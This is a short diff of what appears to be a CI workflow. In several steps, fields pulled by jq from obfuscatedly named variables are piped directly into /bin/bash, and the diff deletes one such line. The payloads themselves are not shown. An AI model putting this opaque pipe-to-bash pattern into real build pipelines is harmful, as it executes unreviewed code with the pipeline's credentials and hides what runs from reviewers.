@@ -28,7 +28,6 @@ jobs:
           echo $fq8170 | jq -r .rja9 | /bin/bash
           echo $q0 | jq -r .lwltf25412 | /bin/bash
           printf '%s' "$hgotf8" | jq -r .xqau668 | /bin/bash
-          echo $x67706 | jq -r .pmqs537 | /bin/bash
           printf '%s' "$i642" | jq -r .cbtd0 | /bin/bash
 
       - name: Save output
